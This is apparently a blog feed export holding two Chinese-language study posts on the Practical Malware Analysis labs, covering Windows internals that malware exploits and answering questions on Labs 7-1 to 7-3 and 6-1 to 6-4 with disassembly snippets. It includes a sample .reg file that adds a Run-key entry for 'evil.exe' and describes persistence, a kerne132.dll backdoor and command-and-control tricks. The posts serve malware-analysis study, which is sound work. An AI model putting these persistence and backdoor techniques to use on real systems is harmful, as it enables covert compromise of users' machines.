    <url>/2019/03/%E5%88%86%E6%9E%90%E6%81%B6%E6%84%8FWindows%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>多数恶意代码运行在Windows上，因此对Windows变成概念的深刻理解会帮助我们识别出恶意代码在主机上感染的迹象，本章会介绍一些恶意代码使用Windows功能的独特方式，并且会讨论恶意代码是如何使用内核模式来实现额外功能与自身隐藏的。</p><p><strong>Windows API：</strong>Windows API是一个广泛的功能集合，管理着恶意代码与微软程序库之间的交互方式，Windows  API使用他自己的名字。例如DWORD和WORD类型分别标识32位与16位无符号整数。标准C类型如int、short等通常并不使用。Windows总体上使用匈牙利表达法，作为API函数的标识符，这个表达式使用一个前缀命名，如32位无符号整数变量会以dw开头。</p><span id="more"></span><table><thead><tr><th>类型和前缀</th><th>描述</th></tr></thead><tbody><tr><td>WORD (w)</td><td>一个16位的无符号数值</td></tr><tr><td>DWORD (dw)</td><td>一个双字节、32位的无符号数值</td></tr><tr><td>Handles (H)</td><td>一个对象索引，句柄中存储的信息并没有文档化，而这一句句柄应该只被Windows API来操作。</td></tr><tr><td>Long Pointer (L)</td><td>一个指向零一类型的指针，例如LPByte是指向字节的指针，LPCSTR是一个执行字符串的指针，字符串通常是由LP作为前缀的，因为他们实际上是指针。偶尔也会看到Pointer（P）而不是LP作为另一类型的前缀，在32位系统里，他们和LP是一样的。</td></tr><tr><td>Callback</td><td>表示一个会被Windows API调用的函数。</td></tr></tbody></table><p><strong>句柄：</strong>句柄是在此操作系统中被打开或者被创建的项，句柄应用对象或者地址的情况很像指针你，但是与指针不同，不能用于数学操作。</p><p><strong>文件系统函数：</strong>微软提供了多个函数来访问文件系统</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>CreateFile</td><td>这个函数被用来创建或者打开文件。它可以打开已经存在的文件，管道，流以及IO设备，还能创建新的文件。</td></tr><tr><td>ReadFile WriteFile</td><td>这些函数被用来对文件进行读和写。</td></tr><tr><td>CreateFileMapping MapViewOfFile</td><td>文件映射经常被恶意代码作者使用，因为他们允许将一个文件加载到内存中，以便操作简单，CreateFileMapping函数负责从磁盘上加载一个文件到内存中，MapViewOfFile函数则返回一个指向映射的基地址指针，在文件中的任意位置进行读取和写入。</td></tr></tbody></table><p><strong>特殊文件：</strong>Windows中有一些特殊的文件无法通过盘符和文件夹访问，但是这些文件可能提供对系统硬件和内部数据更强的访问能力，特殊文件可以作为字符串参数传递给热河文件操作函数，并像普通文件一样进行操作，有如下特殊文件类型：</p><table><thead><tr><th>特殊文件类型</th><th>描述</th></tr></thead><tbody><tr><td>共享文件</td><td>共享文件是以<code>\\serverName\share</code>或<code>\\?\servername\share</code>开头命名的特殊文件他们用来访问保存在共享目录中的目录或文件。<code>\\?\</code>前缀告诉操作系统禁用所有的字符串解析并允许访问长文件名。</td></tr><tr><td>通过名字空间访问</td><td>名字空间可以被认为是固定数目的文件夹，每一个文件夹中八平村不同类型的对象。底层的名字空间是NT名字空间，以前缀<code>\</code>开始。以前缀<code>\\.\</code>开始的Win32设备名字空间，可以被恶意代码用来访问物理设备，并且像一个文件进行读写操作。例如恶意代码使用<code>\Device\PhysicalMemory</code>来直接访问物理内存，这允许用户空间程序写到内核空间中。这个技术已经被恶意代码用来修改内核，并隐藏用户空间的程序。</td></tr><tr><td>备用数据流</td><td>备用数据流（ADS）特性允许附加数据到一个已存在的NTFS文件中，相当于添加一个文件到另一个文件中，这些额外数据在列一个目录时不会被显示出来，在显示文件内容时也不显示，只有在你访问流时才能显示。ADS数据流根据约定<code>normalFile.txt:Stream:$DATA</code>来命名，这允许一个程序去读写一个流。</td></tr></tbody></table><p><strong>Windows注册表：</strong>注册表用来保存操作系统与程序的配置信息，是揭示恶意代码感染迹象的很好来源，注册表有以下几个关键术语：</p><ul><li>根键：注册表被划分为成为根键的五个顶层节</li><li>子键：一个子键就像是一个文件夹中的子文件夹</li><li>键：一个键是一个注册表中的文件夹</li><li>值项：一个值项是一个配对的名字或值</li><li>值或数据：值或数据是存储在注册表项中的数据</li></ul><p><strong>注册表根键：</strong>注册表被划分为如下5个根键：</p><table><thead><tr><th>根键名称</th><th>作用</th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE (HKLM)</td><td>保存对本地机器的全局设置</td></tr><tr><td>HKEY_CURRENT_USER (HKCU)</td><td>保存对当前用户的特定设置</td></tr><tr><td>HKEY_CLASS_ROOT</td><td>保存定义的类型信息</td></tr><tr><td>HKEY_CURRENT_CONFIG</td><td>保存关于当前硬件的设置</td></tr><tr><td>HKEY_USERS</td><td>定义默认用户、新用户以及以前用户的配置</td></tr></tbody></table><p>一个常用的子键：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code>这个子键包含了当一个用户登陆时被自动启动的可执行程序，恶意代码可能会向次子键中添加键值来实现恶意代码的持久化驻留。</p><p><strong>常用的注册表函数：</strong>以下是一些常见的注册表函数：</p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>RegOpenKeyEx</td><td>打开一个注册表进行编辑和查询。有些函数允许你查询和编辑一个注册表键而不用先打开它，但是大多数程序还是会先使用这个函数</td></tr><tr><td>RegSetValueEx</td><td>添加一个新值到注册表，并设置它的数值</td></tr><tr><td>RegSetValue</td><td>返回注册表中一个值项的数值</td></tr></tbody></table><p><strong>注册表脚本：</strong>注册表脚本以<code>.reg</code>为文件后缀，当用户双击此文件时，他会自动恩据自身的内容来修改注册表，此类文件内容类似如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reg">Windows Registry Editer Version 5.00<br><br>[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>&quot;MaliciousValue&quot;=&quot;C:\Windows\evil.exe<br></code></pre></td></tr></table></figure><p><strong>伯克利兼容套接字：</strong>伯克利兼容套接字的网络功能是由Windows中的Winsock库实现的，主要在<code>ws2_32.dll</code>中。在所有的库函数中，<code>socket</code>、<code>connect</code>、<code>bind</code>、<code>listen</code>、<code>accept</code>、<code>send</code>和<code>recv</code>是最常用的，如下是这些函数的描述：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>socket</td><td>创建一个套接字</td></tr><tr><td>bind</td><td>将一个套接字绑定到一个特定端口</td></tr><tr><td>listen</td><td>一个套接字即将进入监听，等待入站连接</td></tr><tr><td>accept</td><td>向一个远程套接字打开一个连接，并接收连接</td></tr><tr><td>connect</td><td>向一个远程套接字打开一个连接，远程套接字必须在等待连接</td></tr><tr><td>recv</td><td>从远程套接字接收数据</td></tr><tr><td>send</td><td>发送数据至远程套接字</td></tr></tbody></table><p><strong>WinINET API：</strong>这是一个保存在<code>Wininet.dll</code>中的比伯克利套接字更高一层的API，实现了应用层的协议，函数如下：</p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>InternetOpen</td><td>初始化一个到互联网的连接</td></tr><tr><td>InternetOpenURL</td><td>访问一个URL</td></tr><tr><td>InternetReadFile</td><td>从互联网中下载数据</td></tr></tbody></table><p><strong>进程：</strong>一个进程是Windows正在执行的程序，Windows使用进程作为管理资源的容器。</p><p><strong>创建进程：</strong>恶意代码最常使用<code>CreatPrcess</code>来创建一个进程，这个函数有很多参数，并且调用者有很多控制它如何被创建的方法。</p><p><strong>线程：</strong>线程是执行代码的容器，线程才是Windows操作系统真正要执行的内容。线程是被CPU执行的独立的指令序列，而不需要等待其他的线程。</p><p><strong>创建线程：</strong><code>CreateThread</code>函数被用来创建一个新线程。函数的调用者指定一个调用地址。</p><p><strong>互斥量：</strong>互斥量是全局对象，用于协调多个进程和线程，其主要控制共享资源段额访问，并且经常被恶意代码所使用，同一时刻，只有一个线程拥有一个互斥量。线程通过一个对<code>WaitForSingleObject</code>的调用来获取对互斥量的访问，当一个线程完成对互斥量的使用后，使用<code>ReleaseMutex</code>函数来释放互斥量。一个互斥量由<code>CreateMutex</code>函数进行创建，进程可以通过<code>OpenMutex</code>来调用获取另一个进程中互斥量的句柄。</p><p><strong>服务：</strong>恶意代码执行附加代码的另一种方式是将他们以服务形式安装，Windows允许通过使用服务，来使任务作为后台应用程序运行，而不需要他们自己的进程或线程，代码被Windows服务管理器调度和运行，但是没有用户的输入。下列是一些关于服务的Windows API 函数：</p><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>OpenSCManager</td><td>返回一个服务控制管理器的句柄，它被用来进行所有后续与服务相关的函数的调用。所有要和服务交互的代码都会调用这个函数。</td></tr><tr><td>CreateServices</td><td>添加一个新服务到服务控制管理器，并允许调用者指定服务是否在引导使自动启动或者必须手动启动。</td></tr><tr><td>StartService</td><td>启动一个服务，并且仅在服务被设置成手动启动时使用。</td></tr></tbody></table><p><strong>组件对象模型：</strong>微软组件对象模型（COM）是一个接口标准，它使得不同软件组件在不知道其他代码的接口规范时相互之间可以调用。每一个使用COM的线程，必须在调用任何其他COM库函数之前，至少调用一次<code>OleInitialize</code>或<code>ConInitializeEx</code>函数。所以，我们可以通过搜索程序的这两个调用来判断程序是否使用了COM功能。</p><p><strong>COM服务器恶意代码：</strong>有些恶意代码通过实现一个恶意COM服务器来实现监控互联网流量，跟踪浏览器使用并不使用恶意代码自身的进程，这个服务器很容易被检测，因为它包含如下的函数：</p><p><code>DlCanUnloadNow</code>、<code>DllGetClassObject</code>、<code>DllInstall</code>、<code>DllRegisterServer</code>、<code>DllUnregisterServer</code>。</p><p><strong>内核与用户模式：</strong>几乎所有代码都运行在用户模式，除了操作系统和硬件驱动运行在内核模式，通常，用户模式不能直接访问硬件，并且智能访问CPU上多有寄存器和可用指令的一个子集，为了在用户模式下改变内核中的状态，你必须依赖Windows API。所有运行在内核的进程共享资源和内存地址。内核模式的代码有更少的安全检查。</p><p><strong>原生API：</strong>原声API使用来和Windows进行交互的底层API，多用于恶意代码，调用原生API可以绕过普通的Windows API。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab7-1"><a href="#Lab7-1" class="headerlink" title="Lab7-1"></a>Lab7-1</h3><p><strong>分析在文件Lab07-01.exe中发现的恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.当计算机重启后，这个程序如何确保他的继续运行（达到持久化驻留）？</strong></p><p>通过分析恶意代码<code>main</code>函数看到如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">lea     eax, [esp+10h+ServiceStartTable]<br>mov     [esp+10h+ServiceStartTable.lpServiceName], offset aMalservice ; &quot;MalService&quot;<br>push    eax             ; lpServiceStartTable<br></code></pre></td></tr></table></figure><p>可见这个程序通过创建一个名为<code>MalService</code>的服务来实现持久化驻留。</p><p><strong>2.为什么这个程序会使用一个互斥量？</strong></p><p>程序通过使用<code>HGL345</code>作为互斥量来防止程序对服务的重复创建。</p><p><strong>3.可以用来检测这个程序的基于主机的特征是什么？</strong></p><p>互斥量<code>HGL345</code></p><p>创建服务<code>MalService</code></p><p><strong>4.检测这个恶意代码的基于网络的特征是什么？</strong></p><p>程序使用<code>Internet Explorer 8.0</code>对<code>http://www.malwareanalysisbook.com</code>发起连接。</p><p><strong>5.这个程序的目的是什么？</strong></p><p>程序创建20个线程对<code>http://www.malwareanalysisbook.com</code>建立远程连接。可能使为了发动DDOS攻击。</p><p><strong>6.这个程序什么时候完成执行？</strong></p><p>从2100年开始就不会停止。</p><h3 id="Lab7-2"><a href="#Lab7-2" class="headerlink" title="Lab7-2"></a>Lab7-2</h3><p><strong>分析在文件Lab07-02.exe中发现的恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.这个程序如何完成持久化驻留？</strong></p><p>本程序无持久化驻留措施。</p><p><strong>2.这个程序的目的是什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00403010 psz:                                    ; DATA XREF: _main+3C↑o<br>.data:00403010                 text &quot;UTF-16LE&quot;, &#x27;http://www.malwareanalysisbook.com/ad.html&#x27;,0<br></code></pre></td></tr></table></figure><p>通过查看函数参数 <code>CoCreateInstance(&amp;rclsid, 0, 4u, &amp;riid, &amp;ppv);</code>，<code>rclsid</code>为：</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">?? ?? ?? ??<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 <span class="hljs-number"> 01 </span>DF<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ????............<br>C0<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 46 </span><span class="hljs-number"> 61 </span>16 0C D3 AF CD D0<span class="hljs-number"> 11 </span> .......Fa..盈 托 .<br></code></pre></td></tr></table></figure><p>按照大端序的顺序可得<code>rclsid</code>为<code>0002DF01-0000-0000-C000-000000000046</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C0</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">46</span>  <span class="hljs-number">61</span> <span class="hljs-number">16</span> <span class="hljs-number">0</span>C D3 AF CD D0 <span class="hljs-number">11</span>  .......Fa..盈 托 .<br><span class="hljs-attribute">8A</span> <span class="hljs-number">3</span>E <span class="hljs-number">00</span> C0 <span class="hljs-number">4</span>F C9 E2 <span class="hljs-number">6</span>E  FF FF FF FF <span class="hljs-number">80</span> <span class="hljs-number">11</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>  ...繭 赦 n....€.@.<br></code></pre></td></tr></table></figure><p>同理<code>riid</code>为<code>D30C1661-CDAF-11D0-8A3E-00C04FC9E26E</code></p><p>在注册表中查询这两个值：</p><p><img src="https://i.loli.net/2019/03/14/5c89b1669cc17.png"></p><p><img src="https://i.loli.net/2019/03/14/5c89b42d2d812.png"></p><p>因此这个此程序使用IE打开一个ad.html的页面。</p><p><strong>3.这个程序什么时候完成执行？</strong></p><p>显示广告之后便执行完成。</p><h3 id="Lab7-3"><a href="#Lab7-3" class="headerlink" title="Lab7-3"></a>Lab7-3</h3><p><strong>对于这个实验，我们在执行前获取到恶意的可执行程序，Lab07-03.exe，以及DLL，Lab07-03.dll。声明这一点很重要，这是因为恶意代码一旦运行可能会发生改变。两个文件在受害者机器上的同一个目录下被发现，如果你运行这个程序，你应该确保两个此文件在分析机器上的同一个目录中。一个以127开始的IP字符串连接到了本地机器。（在这个恶意代码的实际版本中，这个地址会连接到一个远程机器，但是我们已经将他设置成连接本地主机来保护你。）</strong></p><p><strong>这个实验可能比前面的那些有更大的挑战。你将需要使用静态额动态的方法的组合，并聚焦在全局视图上，避免陷入细节。</strong></p><p><strong>问题</strong></p><p><strong>1.这个程序如何完成持久化驻留，来确保在计算机重启后它能继续运行？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:00403010 dword_403010    dd &#x27;nrek&#x27;               ; DATA XREF: sub_4010A0+EC↑o<br>.data:00403010                                         ; _main+1A8↑r<br>.data:00403014 dword_403014    dd &#x27;231e&#x27;               ; DATA XREF: _main+1B9↑r<br>.data:00403018 dword_403018    dd &#x27;lld.&#x27;               ; DATA XREF: _main+1C2↑r<br>.data:0040301C dword_40301C    dd 0 <br></code></pre></td></tr></table></figure><p>通过函数的调用，可以看到以上字符串拼接起来就是<code>kerne123.dll</code>，程序使用<code>CopyFile</code>函数创建<code>C:\\windows\\system32\\kerne132.dll</code></p><p><strong>2.这个恶意代码的两个明显的基于主机的特征是什么？</strong></p><ul><li>创建了一个文件<code>C:\\windows\\system32\\kerne132.dll</code></li><li>创建了一个互斥量<code>SADFHUHF</code></li></ul><p><strong>3.这个程序的目的是什么？</strong></p><p>程序将所有用到此<code>DLL</code>的程序进行修改，并向<code>Lab07-03.dll</code>文件中新增导入表，使得原本<code>kernel32.dll</code>的导出函数在此DLL文件中同样适用。通过这个<code>DLL</code>文件作为后门来执行命令或者进行休眠。</p><p><strong>4.一旦这个恶意代码被安装，你如何移除它？</strong></p><p>通过PE系统修改正常的<code>kernel32.dll</code>文件为<code>kerne123.dll</code>并替换掉恶意文件，或者通过脚本将恶意代码修改的数据改成正常数据。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>Windows恶意代码</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>识别汇编中的C代码结构</title>
    <link href="/2019/03/%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/"/>
    <url>/2019/03/%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<hr><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>本章将通过讨论超过十种的不同的C代码结构来分析不同的汇编代码，帮助我们快速的提升形成恶意代码功能的高级视图的能力</p><p><strong>全局变量|局部变量：</strong>全局变量可以被程序中任意函数访问和使用，局部变量只能在它被定义的函数中访问，在汇编代码中，全局变量通过内存地址引用，而局部变量通过栈地址引用。</p><p><strong>识别if语句：</strong>有if语句一定存在跳转，但是有跳转不一定是if语句，if语句前有一个<code>cmp</code>指令用于对比条件，之后会有一个<code>jnz</code>指令来决定是否进行跳转。</p><p><strong>for循环：</strong><code>for</code>循环是一个C变成使用的基本循环机制。<code>for</code>循环总之有四个组件：初始化、比较、执行命令、变量的递增或递减。</p><p><strong>while循环：</strong><code>while</code>循环与<code>for</code>循环的汇编代码类似，但是区别在于while循环没有递增或者递减的代码。当一个<code>cmp</code>指令返回一定的值后<code>while</code>循环就会终止。</p><span id="more"></span><p><strong>switch语句：</strong><code>switch</code>语句通常以两种方式被编译，使用if样式或者使用跳转表。跳转表是编译器对汇编代码做出的优化，一旦很多个<code>cmp</code>指令的数据成等差数列，则编译器会把跳转地址与数据联系起来做成跳转表。</p><p><strong>函数调用约定：</strong>函数调用约定决定了函数调用发生的方式，这些约定包含了参数被放在栈上或寄存器中的次序，以及是由调用者还是被调用者负责在函数执行完成时清理栈。以下时常见的三种调用约定;</p><ul><li><code>cdecl</code>：这是最常用的调用约定之一，此约定下。参数从右至左被压入栈，当函数执行完成后由调用者清理栈。</li><li><code>stdcall</code>：除了被调用者在函数执行完成之后清理栈之外，其他与<code>cdecl</code>约定非常类似。</li><li><code>fastcall</code>：fastcall调用约定跨编译器时变化最多，但是整体上的工作情况时类似的，在此约定中，前一些参数（典型的是前两个）被传到寄存器中，备用的寄存器是EDX和ECX（微软fastcall约定），如果需要的话，剩下的参数再以从右至左的次序被加载到栈上，通常使用fastcall比其他约定更高效。</li></ul><p><strong>反汇编数组：</strong>在汇编代码中，数组是通过一个基地址作为起始点来进行访问的，每一个元素的大小并不总是明显的，但是可以通过看这个数组是如何被索引的来进行判断。</p><p><strong>识别结构体：</strong>结构体和数组类似，在IDA中可以使用热键T来建立结构体的识别。</p><h2 id="课后练习"><a href="#课后练习" class="headerlink" title="课后练习"></a>课后练习</h2><h3 id="Lab6-1"><a href="#Lab6-1" class="headerlink" title="Lab6-1"></a>Lab6-1</h3><p><strong>在这个实验中，你将分析在文件Lab06-01.exe中发现的恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.由main函数调用的唯一子过程中发现的主要代码结构是什么？</strong></p><p>可以由IDA的图形模式很简单的看出这是一个if语句的结构</p><p><img src="https://i.loli.net/2019/03/06/5c7fcd9f62ae2.png"></p><p><strong>2.位于0x40105F的子过程是什么？</strong></p><p><code>printf</code></p><p><strong>3.这个程序的目的是什么？</strong></p><p>跟着程序的顺序走，先找到<code>main</code>函数：</p><p><img src="https://i.loli.net/2019/03/06/5c7fd47640f98.png"></p><p><code>main</code>函数中只有一处函数调用<code>sub_401000</code>，查看该函数的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401000 sub_401000      proc near               ; CODE XREF: _main+4↓p<br>.text:00401000<br>.text:00401000 var_4           = dword ptr -4<br>.text:00401000<br>.text:00401000                 push    ebp<br>.text:00401001                 mov     ebp, esp<br>.text:00401003                 push    ecx<br>.text:00401004                 push    0               ; dwReserved<br>.text:00401006                 push    0               ; lpdwFlags<br>.text:00401008                 call    ds:InternetGetConnectedState<br>.text:0040100E                 mov     [ebp+var_4], eax<br>.text:00401011                 cmp     [ebp+var_4], 0<br>.text:00401015                 jz      short loc_40102B<br>.text:00401017                 push    offset aSuccessInterne ; &quot;Success: Internet Connection\n&quot;<br>.text:0040101C                 call    sub_40105F<br>.text:00401021                 add     esp, 4<br>.text:00401024                 mov     eax, 1<br>.text:00401029                 jmp     short loc_40103A<br>.text:0040102B<br>.text:0040102B loc_40102B:                             ; CODE XREF: sub_401000+15↑j<br>.text:0040102B                 push    offset aError11NoInter ; &quot;Error 1.1: No Internet\n&quot;<br>.text:00401030                 call    sub_40105F<br>.text:00401035                 add     esp, 4<br>.text:00401038                 xor     eax, eax<br>.text:0040103A<br>.text:0040103A loc_40103A:                             ; CODE XREF: sub_401000+29↑j<br>.text:0040103A                 mov     esp, ebp<br>.text:0040103C                 pop     ebp<br>.text:0040103D                 retn<br>.text:0040103D sub_401000      endp<br></code></pre></td></tr></table></figure><p>可以从以上内容看到决定<code>jz</code>跳转的是函数<code>InternetGetConnectedState</code>，查阅MSDN发现此函数当存在一个可用的网络连接时返回值为1，ZF标志位为0，<code>jz</code>指令不执行，因此程序调用<code>printf</code>输出<code>&quot;Success: Internet Connection\n&quot;</code>否则输出<code>&quot;Error 1.1: No Internet\n&quot;</code>。因此可以得出判断这是一个用于测试网络连接状态的函数。</p><h3 id="Lab6-2"><a href="#Lab6-2" class="headerlink" title="Lab6-2"></a>Lab6-2</h3><p><strong>分析在Lab06-02.exe中发现的恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.main函数调用的第一个子过程执行了什么操作？</strong></p><p>发现这道题的程序跟上一题是一模一样的，就是判断当前是否有网络连接。</p><p><strong>2.位于0x40117F的子过程是什么？</strong></p><p>还是跟上题一样，<code>printf()</code></p><p><strong>3.被main函数调用的第二个子过程做了什么？</strong></p><p>尝试下载<code>http://www.practicalmalwareanalysis.com/cc.htm</code>并解析此网页的注释部分。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">.data:004070C40000002FChttp://www.practicalmalwareanalysis.com/cc.htm<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( Buffer != <span class="hljs-string">&#x27;&lt;&#x27;</span> || v2 != <span class="hljs-string">&#x27;!&#x27;</span> || v3 != <span class="hljs-string">&#x27;-&#x27;</span> || v4 != <span class="hljs-string">&#x27;-&#x27;</span> )<br>      &#123;<br>        sub_401271(aError23FailToG);<br>        result = <span class="hljs-number">0</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        result = v5;<br>      &#125;<br></code></pre></td></tr></table></figure><p><strong>4.在这个子过程中使用了什么类型的代码结构？</strong></p><p><code>if</code>语句的结构和数组，以下明显是一个数组的比较过程：</p><p><img src="https://i.loli.net/2019/03/06/5c7fe867a4b16.png"></p><p><strong>5.在这个程序中有任何基于网络的指示吗？</strong></p><p>程序会尝试下载网页<code>http://www.practicalmalwareanalysis.com/cc.htm</code></p><p><strong>6.这个恶意代码的目的是什么？</strong></p><p>连接<code>http://www.practicalmalwareanalysis.com/cc.htm</code>用于远程命令和控制服务器。</p><h3 id="Lab6-3"><a href="#Lab6-3" class="headerlink" title="Lab6-3"></a>Lab6-3</h3><p><strong>在这个实验中，我们会分析在文件Lab06-03.exe中发现恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.在比较main函数与实验6-2的main函数调用。从main中调用的新函数是什么？</strong></p><p><code>sub_401130</code></p><p><strong>2.这个新的函数的参数是什么？</strong></p><table><thead><tr><th><code>char a1</code></th><th><code>LPCSTR lpExistingFileName</code></th></tr></thead><tbody><tr><td>从网页中解析出来的命令</td><td>程序名</td></tr></tbody></table><p><strong>3.这个函数包含的主要代码结构是什么？</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00401150                 mov     edx, [ebp+var_8]<br>.text:00401153                 jmp     ds:off_4011F2[edx*4] ; switch jump<br></code></pre></td></tr></table></figure><p>由这个跳转命令可以得知这里主要的代码结构是<code>switch</code>结构，采用跳转表。</p><p><strong>4.这个函数能够做什么？</strong></p><p>根据获取到的指令来执行不同的操作，比如创建目录<code>C:\\Temp</code>、拷贝文件<code>cc.exe</code>至目录<code>C:\\Temp</code>、删除文件、休眠100s、打印错误信息、删除文件。</p><p><strong>5.在这个恶意代码中有什么本地特征吗？</strong></p><p>创建目录<code>C:\\Temp</code>，创建文件<code>cc.exe</code>、注册表键<code>Software\Microsoft\Windows\CurrentVersion\Run</code></p><p><strong>6.这个恶意代码的目的是什么？</strong></p><p>根据网页注释中的命令来选择在目标主机上选择执行不同的功能。</p><h3 id="Lab6-4"><a href="#Lab6-4" class="headerlink" title="Lab6-4"></a>Lab6-4</h3><p><strong>在这个实验中，我们会分析在文件Lab06-04.exe中发现的恶意代码。</strong></p><p><strong>问题</strong></p><p><strong>1.在实验6-3和实验6-4的main函数的调用之间的区别是什么？</strong></p><p>函数地址发生了变化。</p><p><strong>2.新的代码结构已经被添加到main中？</strong></p><p>实验6-4的main函数中有一个for循环，而实验6-3是一个if判断语句：</p><p><img src="https://i.loli.net/2019/03/06/5c7fe49b20616.png"></p><p><strong>3.这个实验的解析HTML的函数和前面实验中的那些有什么区别？</strong></p><p>这个实验中，此函数新增了一个参数作为函数<code>sprintf()</code>的参数</p><p><code>sprintf(&amp;szAgent, aInternetExplor, a1);</code></p><p><strong>4.这个程序会运行多久？（假设它以经连接到互联网）</strong></p><p>Sleep函数的参数为</p><p><img src="https://i.loli.net/2019/03/06/5c7fe545a0a81.png"></p><p>此循环会执行1440次，因此程序会运行<code>1440*60s=1440m=24h=1d</code></p><p>所以此程序会运行整整一天。</p><p><strong>5.在这个恶意代码中有什么新的基于网络的迹象吗？</strong></p><p>这道题需要细心，之前的<code>HTTP</code>头中的<code>User-Agent</code>使用的是<code>Internet Explorer 7.5/pma</code>，而现在是<code>Internet Explorer 7.5/pma%d</code></p><p><strong>6.这个恶意代码的目的是什么？</strong></p><p>在24小时内每一分钟连续尝试从网页上获取命令并执行。</p><hr><h2 id="本章结束🎊"><a href="#本章结束🎊" class="headerlink" title="本章结束🎊"></a>本章结束🎊</h2>]]></content>
    
    
    <categories>
      
      <category>二进制安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码分析</tag>
      
      <tag>汇编语言</tag>
      
      <tag>C语言</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA Pro使用方法</title>
    <link href="/2019/03/IDA-Pro%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2019/03/IDA-Pro%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
